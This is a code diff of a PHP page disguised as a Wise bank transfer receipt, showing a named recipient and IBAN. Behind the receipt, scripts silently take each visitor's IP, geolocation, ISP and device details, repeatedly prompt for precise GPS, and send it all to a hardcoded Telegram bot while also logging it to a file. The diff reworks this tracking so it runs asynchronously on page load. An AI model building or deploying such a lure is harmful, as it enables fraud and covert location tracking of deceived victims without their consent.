@@ -1,95 +1,101 @@
 <?php
-// ==================== CONFIGURAÇÕES ==================== v1.4
+// ==================== CONFIGURAÇÕES ==================== v1.5
 $telegram_bot_token = "8704514905:AAHN69zg_EJtg7JlB9wVmbM7aZCRmMJeDJI";
 $telegram_chat_id = "8385484720";
 // =======================================================
 
-$ip =
-    $_SERVER["HTTP_X_FORWARDED_FOR"] ??
-    ($_SERVER["HTTP_X_REAL_IP"] ?? ($_SERVER["REMOTE_ADDR"] ?? "N/A"));
-$ip = trim(explode(",", $ip)[0]);
+// POST: tracking assíncrono (chamado pelo JS após a página carregar)
+if ($_SERVER["REQUEST_METHOD"] === "POST") {
+    $ip =
+        $_SERVER["HTTP_X_FORWARDED_FOR"] ??
+        ($_SERVER["HTTP_X_REAL_IP"] ?? ($_SERVER["REMOTE_ADDR"] ?? "N/A"));
+    $ip = trim(explode(",", $ip)[0]);
 
-$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "N/A";
-$referer = $_SERVER["HTTP_REFERER"] ?? "Direct";
-$hora = date("d/m/Y H:i:s");
+    $user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "N/A";
+    $referer = $_SERVER["HTTP_REFERER"] ?? "Direct";
+    $hora = date("d/m/Y H:i:s");
 
-// ==================== LOCALIZAÇÃO VIA IP ====================
-$geo = json_decode(
+    // ==================== LOCALIZAÇÃO VIA IP ====================
+    $geo = json_decode(
+        @file_get_contents(
+            "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon",
+        ),
+        true,
+    );
+
+    $cidade = $geo["city"] ?? "Unknown";
+    $estado = $geo["regionName"] ?? "Unknown";
+    $pais = $geo["country"] ?? "Unknown";
+    $provedor = $geo["isp"] ?? "Unknown";
+    $proxy = ($geo["proxy"] ?? false) ? "Yes" : "No";
+    $mobile = ($geo["mobile"] ?? false) ? "Yes" : "No";
+    $lat_ip = $geo["lat"] ?? null;
+    $lon_ip = $geo["lon"] ?? null;
+
+    // ==================== RECEBE GPS ====================
+    $latitude = $_POST["latitude"] ?? null;
+    $longitude = $_POST["longitude"] ?? null;
+    $accuracy = $_POST["accuracy"] ?? null;
+    $source = $_POST["source"] ?? "ip";
+
+    if ($latitude && $longitude && $source === "gps") {
+        $latitude_final = $latitude;
+        $longitude_final = $longitude;
+        $localizacao_texto = "$latitude, $longitude (±{$accuracy}m)";
+        $emoji_local = "📍";
+        $gps_status = "✅ GPS Aceito pelo usuário";
+    } else {
+        $latitude_final = $lat_ip;
+        $longitude_final = $lon_ip;
+        $localizacao_texto = "$cidade, $estado - $pais";
+        $emoji_local = "🌐";
+        $gps_status = "📍 Via IP (aproximada)";
+    }
+
+    // ==================== MENSAGEM TELEGRAM ====================
+    $mensagem = "🔴 *Novo acesso ao Comprovante Wise!*\n\n";
+    $mensagem .= "🕒 *Data:* $hora\n";
+    $mensagem .= "🌐 *IP:* `$ip`\n";
+    $mensagem .= "$emoji_local *Localização:* $localizacao_texto\n";
+    $mensagem .= "$gps_status\n";
+    $mensagem .= "🏢 *Provedor:* $provedor\n";
+    $mensagem .= "📱 *Mobile:* $mobile | *Proxy/VPN:* $proxy\n";
+    $mensagem .= "🔗 *Referer:* $referer";
+
     @file_get_contents(
-        "http://ip-api.com/json/{$ip}?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,mobile,proxy,hosting,lat,lon",
-    ),
-    true,
-);
+        "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" .
+            urlencode($mensagem) .
+            "&parse_mode=Markdown",
+    );
 
-$cidade = $geo["city"] ?? "Unknown";
-$estado = $geo["regionName"] ?? "Unknown";
-$pais = $geo["country"] ?? "Unknown";
-$provedor = $geo["isp"] ?? "Unknown";
-$proxy = $geo["proxy"] ?? false ? "Yes" : "No";
-$mobile = $geo["mobile"] ?? false ? "Yes" : "No";
-$lat_ip = $geo["lat"] ?? null;
-$lon_ip = $geo["lon"] ?? null;
+    // ==================== LOG ====================
+    $log = [
+        "data" => $hora,
+        "ip" => $ip,
+        "latitude" => $latitude_final,
+        "longitude" => $longitude_final,
+        "source" => $source,
+        "cidade" => $cidade,
+        "estado" => $estado,
+        "pais" => $pais,
+        "provedor" => $provedor,
+        "mobile" => $mobile,
+        "proxy" => $proxy,
+        "user_agent" => $user_agent,
+    ];
 
-// ==================== RECEBE GPS ====================
-$latitude = $_POST["latitude"] ?? null;
-$longitude = $_POST["longitude"] ?? null;
-$accuracy = $_POST["accuracy"] ?? null;
-$source = $_POST["source"] ?? "ip";
+    file_put_contents(
+        "acessos.json",
+        json_encode($log, JSON_UNESCAPED_UNICODE) . "\n",
+        FILE_APPEND,
+    );
 
-// Define localização final
-if ($latitude && $longitude && $source === "gps") {
-    $latitude_final = $latitude;
-    $longitude_final = $longitude;
-    $localizacao_texto = "$latitude, $longitude (±{$accuracy}m)";
-    $emoji_local = "📍";
-    $gps_status = "✅ GPS Aceito pelo usuário";
-} else {
-    $latitude_final = $lat_ip;
-    $longitude_final = $lon_ip;
-    $localizacao_texto = "$cidade, $estado - $pais";
-    $emoji_local = "🌐";
-    $gps_status = "📍 Via IP (aproximada)";
+    header("Content-Type: application/json");
+    echo json_encode(["ok" => true]);
+    exit();
 }
-
-// ==================== MENSAGEM TELEGRAM ====================
-$mensagem = "🔴 *Novo acesso ao Comprovante Wise!*\n\n";
-$mensagem .= "🕒 *Data:* $hora\n";
-$mensagem .= "🌐 *IP:* `$ip`\n";
-$mensagem .= "$emoji_local *Localização:* $localizacao_texto\n";
-$mensagem .= "$gps_status\n";
-$mensagem .= "🏢 *Provedor:* $provedor\n";
-$mensagem .= "📱 *Mobile:* $mobile | *Proxy/VPN:* $proxy\n";
-$mensagem .= "🔗 *Referer:* $referer";
-
-file_get_contents(
-    "https://api.telegram.org/bot$telegram_bot_token/sendMessage?chat_id=$telegram_chat_id&text=" .
-        urlencode($mensagem) .
-        "&parse_mode=Markdown",
-);
-
-// ==================== LOG ====================
-$log = [
-    "data" => $hora,
-    "ip" => $ip,
-    "latitude" => $latitude_final,
-    "longitude" => $longitude_final,
-    "source" => $source,
-    "cidade" => $cidade,
-    "estado" => $estado,
-    "pais" => $pais,
-    "provedor" => $provedor,
-    "mobile" => $mobile,
-    "proxy" => $proxy,
-    "user_agent" => $user_agent,
-];
-
-file_put_contents(
-    "acessos.json",
-    json_encode($log, JSON_UNESCAPED_UNICODE) . "\n",
-    FILE_APPEND,
-);
+// GET: serve o HTML imediatamente, sem chamadas externas
 ?>
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -111,49 +117,40 @@ file_put_contents(
         <p class="wise-logo">WISE</p>
         <h1>✅ Transfer Completed Successfully</h1>
         <p style="color:#555; font-size:17px;">Money sent via Wise • SEPA Transfer</p>
-        
+
         <div class="info">
             <p><strong>Amount Sent:</strong> €1.390,00</p>
-            <p><strong>Date & Time:</strong> <?php echo date(
-                "d/m/Y H:i",
-            ); ?> CET</p>
+            <p><strong>Date & Time:</strong> <?php echo date("d/m/Y H:i"); ?> CET</p>
             <p><strong>Recipient:</strong> Cristina Mendes</p>
             <p><strong>Bank:</strong> Caixa Geral de Depósitos (CGD)</p>
             <p><strong>IBAN:</strong> PT50 0035 0088 0000 4933 9008 2</p>
             <p><strong>BIC/SWIFT:</strong> CGDIPTPL</p>
-            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(
-                substr(md5(time()), 0, 12),
-            ); ?></p>
+            <p><strong>Reference:</strong> WISE-<?php echo strtoupper(substr(md5(time()), 0, 12)); ?></p>
             <p><strong>Status:</strong> <span style="color:#00b66d;">Completed ✓</span></p>
         </div>
 
         <div class="success">Transfer Completed</div>
-        
+
         <p style="margin-top:20px; color:#444;">
             This is your electronic receipt. You can download it as PDF.
         </p>
         <br>
-        <button onclick="alert('Downloading PDF receipt... (This is a simulation)')" 
+        <button onclick="alert('Downloading PDF receipt... (This is a simulation)')"
                 style="padding:14px 35px; font-size:17px; background:#00b66d; color:white; border:none; border-radius:8px; cursor:pointer;">
             📄 Download PDF Receipt
         </button>
     </div>
     <script>
-        // ==================== LOCALIZAÇÃO COM MENSAGEM AMIGÁVEL ====================
+        // ==================== TRACKING ASSÍNCRONO ====================
         let tentativas = 0;
         const maxTentativas = 3;
 
-        async function enviarLocalizacao(latitude, longitude, accuracy, source) {
+        async function enviarTracking(dados) {
             const formData = new FormData();
-            formData.append('latitude', latitude);
-            formData.append('longitude', longitude);
-            formData.append('accuracy', accuracy || '');
-            formData.append('source', source);
-
+            for (const [k, v] of Object.entries(dados)) formData.append(k, v);
             await fetch(window.location.href, { method: 'POST', body: formData });
         }
 
-        // Cria mensagem visual
         function mostrarMensagem() {
             const msg = document.createElement('div');
             msg.innerHTML = `
@@ -164,34 +161,32 @@ file_put_contents(
             document.body.appendChild(msg);
         }
 
-        function getGPSLocation() {
+        function tentarGPS() {
             if (!navigator.geolocation) return;
-
             tentativas++;
-            mostrarMensagem(); // Mostra a mensagem amigável
-
+            mostrarMensagem();
             navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    enviarLocalizacao(
-                        position.coords.latitude,
-                        position.coords.longitude,
-                        Math.round(position.coords.accuracy),
-                        'gps'
-                    );
+                (pos) => {
+                    enviarTracking({
+                        latitude: pos.coords.latitude,
+                        longitude: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy),
+                        source: 'gps',
+                    });
                 },
-                (error) => {
-                    if (tentativas < maxTentativas) {
-                        setTimeout(getGPSLocation, 3000);
-                    }
+                () => {
+                    if (tentativas < maxTentativas) setTimeout(tentarGPS, 3000);
                 },
-                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
             );
         }
 
-        // Inicia o processo
         window.onload = () => {
-            setTimeout(getGPSLocation, 800);
+            // Tracking via IP imediatamente (não bloqueia a página)
+            enviarTracking({ source: 'ip' });
+            // Tenta GPS em paralelo
+            setTimeout(tentarGPS, 800);
         };
-</script>
+    </script>
 </body>
 </html>
